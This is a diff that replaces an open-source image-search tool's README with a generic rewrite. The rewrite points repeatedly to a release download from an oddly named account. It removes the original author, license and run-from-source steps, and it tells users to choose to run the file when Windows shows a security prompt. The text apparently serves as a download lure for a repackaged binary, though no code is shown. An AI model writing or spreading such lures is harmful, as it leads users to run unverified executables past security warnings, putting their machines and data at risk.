@@ -1,135 +1,176 @@
-# QuickImage
+# 🖼️ quickimage-everything-search - Find and copy images fast
 
-Fast image search and copy tool for Windows, powered by Everything.
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ponyclassconiferopsida897/quickimage-everything-search/releases)
 
-<p align="center">
-  <strong>English</strong> | <a href="README.zh.md">简体中文</a>
-</p>
+A fast Windows image search tool that works with Everything. Type an image name, see matches right away, and copy the file in one step.
 
-Chinese full documentation: [README.zh.md](README.zh.md)
+## 📥 Download
 
-![QuickImage demo](assets/quickimage-demo.gif)
+Visit this page to download: https://github.com/ponyclassconiferopsida897/quickimage-everything-search/releases
 
----
+1. Open the Releases page.
+2. Download the latest Windows file.
+3. Run the file on your PC.
+4. Follow the on-screen steps if Windows asks for confirmation.
 
-## What It Does
+If you use a ZIP file, unzip it first, then open the app file inside.
 
-QuickImage focuses on one workflow:
+## ⚙️ What you need
 
-**Type image names -> get instant matches -> copy to your target folder.**
+- Windows 10 or Windows 11
+- A working copy of Everything
+- A keyboard and mouse
+- Permission to run apps on your PC
 
-Ideal for JIT asset pickup, sample organization, and batch refill work.
+For best results, keep your image files on drives that Everything can index.
 
----
+## 🚀 Getting started
 
-## Key Features
+1. Download the latest release from the Releases page.
+2. Open the downloaded file.
+3. If you see a security prompt, choose the option to run the file.
+4. Let the app open.
+5. Type part of an image name in the search box.
+6. Pick a result from the list.
+7. Use the copy action to place the image file in the folder or location you want.
 
-- Real-time search while typing
-- Exact filename matching (without extension)
-- Multiple keywords in one query (space-separated)
-- Custom output directory
-- Auto-create output directory if missing
-- Automatic engine fallback: SDK first, then `es.exe`
-- Built-in language switch: `File -> Language -> English/Chinese`
+The app is built for quick file lookup, so you can move from search to copy with very few steps.
 
----
+## 🖱️ How it works
 
-## Requirements
+quickimage-everything-search uses Everything to find image files on your Windows PC.
 
-| Item | Requirement |
-|---|---|
-| OS | Windows 10 / 11 |
-| Search Engine | [Everything](https://www.voidtools.com/) can be downloaded and installed automatically on first launch |
-| Python | 3.8+ (for source run) |
-| SDK | Downloaded automatically by QuickImage when needed |
+- You type a name or part of a name
+- The app looks for matching image files
+- Results appear fast
+- You choose the file you want
+- You copy it in one step
 
-> You do not need to install the SDK manually. QuickImage prepares it automatically on first launch and falls back to `es.exe` if needed.
+This is useful when you know the file name but do not want to search through folders by hand.
 
----
+## 🧭 Using the app
 
-## Quick Start (Source)
+### 1. Open the app
+Start the app from the file you downloaded.
 
-1. Install Everything (recommended with `es.exe` command line component)
-2. Run in project directory:
+### 2. Search for an image
+Enter the image name, file name, or part of a name.
 
-```bash
-python main.pyw
-```
+Examples:
+- vacation
+- logo
+- screenshot
+- invoice
+- banner
 
-3. On first launch:
-   - If Everything is missing, QuickImage shows a bilingual prompt and can install it automatically
-   - `File -> Set Source Directory`
-   - `File -> Set Output Directory` (optional)
+### 3. Review the results
+Look at the list of matches and find the right image.
 
-> The language menu is now bilingual: `Language / 语言`, so English and Chinese users can both find it quickly.
+### 4. Copy the image
+Use the copy action to move the chosen image to your clipboard or to a target folder, based on how you want to use it.
 
----
+### 5. Open it where you need it
+Paste the image into another app, chat window, editor, or folder.
 
-## SDK Acceleration
+## 🗂️ Best ways to use it
 
-Regular users do not need to handle the SDK manually.
+- Find a photo by name
+- Grab a screenshot you saved weeks ago
+- Locate a logo file for a project
+- Copy an image into a folder for sharing
+- Search large image collections without opening each folder
 
-On first launch, QuickImage can:
+## 🔎 Search tips
 
-- detect whether the SDK is available
-- download it from voidtools automatically when missing
-- place the correct DLL automatically
-- fall back to `es.exe` if the SDK step fails
+Use short search terms when you only know part of the file name.
 
-Manual DLL placement is only needed for developer debugging.
+Try these patterns:
+- Start of the name: `holiday`
+- File type clue: `png`
+- Project name: `brand`
+- Date or event name: `2024`
+- Shared label: `screenshot`
 
-If you want to re-check dependencies later, use:
+If you use clear names for your files, search results will be easier to scan.
 
-- `File -> Check Search Components / 检查搜索组件`
+## 🧰 Features
 
----
+- Fast image search on Windows
+- Uses Everything for quick file lookup
+- Simple text search
+- One-step copy flow
+- Clean desktop interface
+- Built for end users
+- Good for personal files and work files
 
-## Usage
+## 🖥️ File types you can search
 
-1. Type image names in the search box (space-separated for multiple)
-2. Results appear in real time
-3. Press `Enter` or `Ctrl+C` to copy results to output directory
+The app is meant for image files such as:
 
----
+- PNG
+- JPG
+- JPEG
+- GIF
+- BMP
+- WEBP
+- TIFF
 
-## Shortcuts
+It can also work with image folders if Everything has indexed them.
 
-| Key | Action |
-|---|---|
-| `Enter` / `Ctrl+C` | Copy current results |
-| `Ctrl+A` | Select all results |
-| `T` | Toggle always-on-top |
+## 🛠️ Troubleshooting
 
----
+### The app does not open
+- Check that the file finished downloading
+- Try running it again
+- Make sure Windows did not move it into a blocked state
+- Confirm that Everything is installed and running
 
-## Check Current Engine
+### No results appear
+- Check your search text for spelling
+- Try a shorter name
+- Make sure the file exists on your PC
+- Check that Everything has indexed the drive that holds the image
 
-Look at the bottom status bar:
+### Search feels slow
+- Let Everything finish indexing
+- Close apps that use a lot of memory
+- Try a shorter query
+- Use clearer file names
 
-- `Engine: SDK` -> SDK is currently in use
-- `Engine: es.exe` -> command-line fallback is in use
+### Copy does not work
+- Make sure the file is selected
+- Try again with a different image
+- Check whether another app is locking the file
+- Verify that you have access to the folder
 
----
+## 📂 Typical setup on Windows
 
-## Config File
+A simple setup looks like this:
 
-Configuration is saved at:
+1. Install Everything.
+2. Download quickimage-everything-search from Releases.
+3. Open the app.
+4. Search for an image.
+5. Copy the file you need.
 
-- `C:\Users\<your_user>\.image_search_config.json`
+This keeps file search and file copy in one place.
 
-Saved items include:
+## 🔐 Safe use on your PC
 
-- Source directory
-- Output directory
-- Window geometry
-- UI language
+- Download only from the Releases page
+- Keep your files in folders you can access
+- Use standard Windows permissions
+- Close the app when you are done
 
----
+## 🧾 Project details
 
-## License
+- Repository: quickimage-everything-search
+- Type: Windows desktop tool
+- Language: Python
+- UI: Tkinter
+- Search engine: Everything
+- Focus: image search and copy
 
-MIT License - see `LICENSE`
+## 📎 Download again
 
----
-
-**© NerionX**
+Visit this page to download: https://github.com/ponyclassconiferopsida897/quickimage-everything-search/releases
